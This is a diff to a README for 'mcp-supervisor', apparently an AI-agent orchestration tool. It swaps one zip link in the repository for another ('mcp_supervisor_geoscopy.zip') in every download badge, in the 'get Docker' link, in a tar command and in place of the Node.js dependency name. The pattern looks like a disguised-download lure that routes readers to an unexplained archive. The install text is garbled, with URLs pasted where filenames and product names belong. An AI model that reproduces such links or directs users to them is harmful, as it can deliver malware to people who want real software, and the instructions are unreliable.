@@ -1,6 +1,6 @@
 # 🚀 mcp-supervisor - Manage Your Autonomous Agents with Ease
 
-[![Download mcp-supervisor](https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip)
+[![Download mcp-supervisor](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip%20Now-Visit%20Releases-blue)](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip)
 
 ## 📦 Overview
 
@@ -14,18 +14,18 @@ To get started with mcp-supervisor, follow these simple steps:
    - Ubuntu 18.04 or later
    - At least 4 GB of RAM
    - 2 CPU cores
-   - Docker installed *(You can get Docker [here](https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip))*
+   - Docker installed *(You can get Docker [here](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip))*
 
 2. **Visit the Releases Page:**
    - You can find the latest version of mcp-supervisor on our releases page.
    - Click the button below to visit the page:
-     [![Download mcp-supervisor](https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip)
+     [![Download mcp-supervisor](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip%20Now-Visit%20Releases-blue)](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip)
 
 ## 📥 Download & Install
 
 1. **Download the Package:**
    - Once you're on the releases page, look for the latest release.
-   - Download the `https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip` or `.zip` package that suits your needs.
+   - Download the `https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip` or `.zip` package that suits your needs.
 
 2. **Extract the Package:**
    - Open your terminal and use the following command to navigate to your download location:
@@ -34,7 +34,7 @@ To get started with mcp-supervisor, follow these simple steps:
      ```
    - Extract the downloaded file with:
      ```bash
-     tar -xzf mcp-supervisor-{version}https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip
+     tar -xzf mcp-supervisor-{version}https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip
      ```
    - Replace `{version}` with the actual version number in the file name.
 
@@ -73,7 +73,7 @@ If you encounter issues during installation or while running mcp-supervisor, con
 
 - **Permission Issues:** If you face permission errors, try running commands with `sudo`.
 
-- **Dependency Issues:** Ensure you have https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip and npm installed. You can install them using:
+- **Dependency Issues:** Ensure you have https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip and npm installed. You can install them using:
   ```bash
   sudo apt install nodejs npm
   ```
@@ -98,4 +98,4 @@ agent-orchestration, automation, autonomous-agents, docker, express, mcp, model-
 
 Feel free to dive into the world of autonomous agents with mcp-supervisor today! Start by downloading from the link below:
 
-[![Download mcp-supervisor](https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/dull-quay940/mcp-supervisor/main/agents/mcp-supervisor_1.5-beta.4.zip)
+[![Download mcp-supervisor](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip%20Now-Visit%20Releases-blue)](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip)
